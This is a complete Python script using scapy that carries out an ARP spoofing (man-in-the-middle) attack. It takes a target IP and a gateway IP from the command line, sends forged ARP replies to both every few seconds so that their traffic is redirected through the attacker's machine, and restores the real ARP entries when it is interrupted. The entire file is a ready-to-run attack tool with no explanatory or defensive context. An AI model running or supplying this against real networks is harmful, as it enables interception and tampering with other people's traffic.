import scapy.all as scapy
import time
import optparse

def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)
    boardcast_packet=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packed=boardcast_packet/arp_request
    answer_list=scapy.srp(combined_packed,timeout=1,verbose=False)[0]

    return answer_list[0][1].hwdst

def arp_poison(target_ip,poison_ip):

    target_mac=get_mac(target_ip)
    arp_response= scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poison_ip)
    scapy.send(arp_response,verbose=False)

def qiut_operation(fooled_ip,gateway_ip):

    fooled_mac=get_mac(fooled_ip)
    gateway_mac=get_mac(gateway_ip)
    arp_response= scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=6)

def user_inputs():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target IP")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP")
    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")
    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options

number=0

user_input_ip=user_inputs()
user_target=user_input_ip.target_ip
user_gateway=user_input_ip.gateway_ip

try:
    while True:

        arp_poison(user_target,user_gateway)
        arp_poison(user_gateway,user_target)
        number += 2
        print("\r Package Sending "+str(number),end="")
        time.sleep(3)

except KeyboardInterrupt:
    print("\n Stopped & Reset")
    qiut_operation(user_target,user_gateway)
    qiut_operation(user_gateway,user_target)